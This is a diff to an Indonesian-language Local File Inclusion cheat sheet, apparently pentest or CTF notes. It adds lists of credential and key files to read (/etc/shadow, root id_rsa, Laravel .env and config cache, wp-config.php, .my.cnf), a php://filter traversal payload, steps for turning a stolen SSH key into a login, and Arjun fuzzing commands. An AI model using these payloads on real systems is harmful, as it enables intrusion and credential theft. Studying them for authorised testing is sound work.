@@ -98,17 +98,40 @@ Windows:
 ### Linux
 
 ```text
-/etc/passwd                      # Daftar user
-/etc/shadow                      # Password hash (butuh root)
-/etc/hosts                       # Host mapping
-/etc/issue                       # Versi OS
-/proc/self/environ               # Environment variables (sering ada credential)
-/proc/self/cmdline               # Command yang sedang berjalan
-/var/log/apache2/access.log      # Web access log
-/var/log/auth.log                # SSH login log
-/root/.ssh/id_rsa                # SSH private key root
-/home/<user>/.bash_history      # History command user
+/etc/passwd                       # Daftar user
+
+/var/www/.env                   # Environment aplikasi Laravel (kredensial DB)
+/var/www/html/.env                # Environment aplikasi Laravel (kredensial DB)
+/var/www/html/config/database.php # Konfigurasi DB Laravel (file PHP, baca via php://filter + base64 decode)
+/var/www/html/bootstrap/cache/config.php # Config cache Laravel (hasil config:cache, isi .env dibaked plain text)
+/var/www/html/wp-config.php       # Kredensial database WordPress
+
+/root/.ssh/id_rsa                 # SSH private key root
+/home/<user>/.ssh/id_rsa          # SSH private key user login (shell /bin/bash)
+/home/<user>/.bash_history        # History command user
+/home/<user>/.mysql_history       # History query MySQL (sering ada password)
+
+/etc/shadow                       # Password hash (butuh root)
+/etc/group                        # Daftar group & anggotanya (info privesc)
+/etc/hosts                        # Host mapping
+/etc/issue                        # Versi OS
+/etc/fstab                        # Daftar mount filesystem
+/etc/crontab                      # Cron job aktif (kandidat privesc)
+/etc/ssh/sshd_config              # Konfigurasi SSH (port & metode auth)
+/proc/self/environ                # Environment variables (sering ada credential)
+/proc/self/cmdline                # Command yang sedang berjalan
+/proc/version                     # Versi kernel (cari CVE)
+/var/log/apache2/access.log       # Web access log (log poisoning)
+/var/log/apache2/error.log        # Web error log (log poisoning)
+/var/log/auth.log                 # SSH login log
+/root/.my.cnf                     # Kredensial MySQL root
+/home/<user>/.ssh/authorized_keys # Public key yang diizinkan login
+/home/<user>/.ssh/known_hosts     # Host lain yang dikenal target (pivot)
+
+
 ```
+
+> **Eksploitasi private key `id_rsa`:** Cari user login (shell `/bin/bash`) di `/etc/passwd` → baca `/home/<user>/.ssh/id_rsa` via LFI → unduh dengan `wget` → rename → `chmod 600` → login `ssh -i`. Alur lengkap & troubleshooting known_hosts: `06-report/03.5-Local File Inclusion.md`.
 
 ### Windows
 
@@ -128,9 +151,17 @@ C:\Users\<user>\Desktop\flag.txt
 
 ```text
 ?page=php://filter/convert.base64-encode/resource=index.php
+?page=php://filter/convert.base64-encode/resource=../../../../var/www/html/bootstrap/cache/config.php
 ```
 
 Decode base64 → lihat source code → cari **credential DB / token JWT / path admin**.
+
+**Target spesial Laravel — `bootstrap/cache/config.php`:** jika developer menjalankan `php artisan config:cache`, semua nilai `.env` (password DB, APP_KEY, SMTP) **dibaked plain text** ke file PHP ini. Karena file PHP dieksekusi saat di-include (isinya tidak ditampilkan), bungkus dengan `php://filter` lalu decode hasil response:
+
+```bash
+# Decode string Base64 hasil response di mesin penyerang
+echo '<STRING_BASE64_HASIL_RESPONSE>' | base64 -d
+```
 
 ### 2. Log Poisoning (Apache/Nginx)
 
@@ -201,9 +232,41 @@ page=, file=, include=, path=, template=, view=, content=, doc=, lang=, dir=
 
 ### 2. Fuzzing Parameter
 
+**ffuf** — brute force nama parameter dengan wordlist:
+
 ```bash
 ffuf -u "http://<TARGET>/index.php?FUZZ=test" -w /usr/share/wordlists/dirb/common.txt -mc 200 -fs 0
 ```
+
+**Arjun** — deteksi parameter tersembunyi via analisis response (lebih akurat dari brute force):
+
+```bash
+# Install (direkomendasikan pipx; jika python versi lama gunakan pip)
+pipx install arjun
+
+# Scan parameter GET (default)
+arjun -u http://<TARGET>/index.php?
+
+# Scan parameter POST
+arjun -u http://<TARGET>/index.php? -m POST
+
+# Scan body JSON (untuk API endpoint)
+arjun -u http://<TARGET>/api -m JSON
+
+# Scan banyak target sekaligus (file text / export Burp / raw request)
+arjun -i targets.txt
+
+# Sertakan parameter wajib yang sudah diketahui (dikirim di setiap request)
+arjun -u http://<TARGET>/index.php? --include 'page=index'
+
+# Mode stabil (thread=1 + delay acak 6-12 detik, untuk target yang rate-limit)
+arjun -u http://<TARGET>/index.php --stable
+
+# Simpan hasil ke file JSON
+arjun -u http://<TARGET>/index.php -oJ hasil.json
+```
+
+> **Bedanya:** ffuf menebak nama parameter dari wordlist dan hanya melihat status/size response. Arjun mengirim nilai berbeda pada kandidat parameter lalu membandingkan perbedaan response — parameter valid tetap terdeteksi walau responsenya tidak berubah secara kasat mata. Sangat berguna untuk menemukan parameter LFI tersembunyi (mis. `?file=`, `?doc=`) yang tidak terlihat di URL aplikasi.
 
 ### 3. Nikto
 
@@ -240,6 +303,7 @@ nikto -h http://<TARGET>
 ## Checklist LFI
 
 - [ ] Identifikasi parameter berisiko (`?page=`, `?file=`, `?lang=`).
+- [ ] Fuzzing parameter tersembunyi dengan Arjun (`arjun -u http://<TARGET>`).
 - [ ] Test path traversal (`../../../etc/passwd`).
 - [ ] Test bypass filter (`....//`, URL encoding).
 - [ ] Baca file sensitif (`/etc/passwd`, `/proc/self/environ`).
